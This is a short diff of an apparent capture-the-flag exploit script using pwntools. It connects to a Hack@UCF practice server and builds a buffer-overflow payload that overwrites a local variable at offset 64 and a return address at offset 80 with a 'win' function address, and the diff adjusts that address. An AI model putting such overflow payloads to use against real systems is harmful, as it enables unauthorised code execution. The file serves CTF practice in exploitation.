@@ -6,7 +6,7 @@ io = remote("ctf.hackucf.org", 9003)
 # pack 0xdeadbeef in to local int at offset 64 and addresss of win at offset 80
 payload = fit({
     64: 0xdeadbeef,
-    80: 0x080491fa
+    80: 0x080491f6
 })
 
 print(payload)
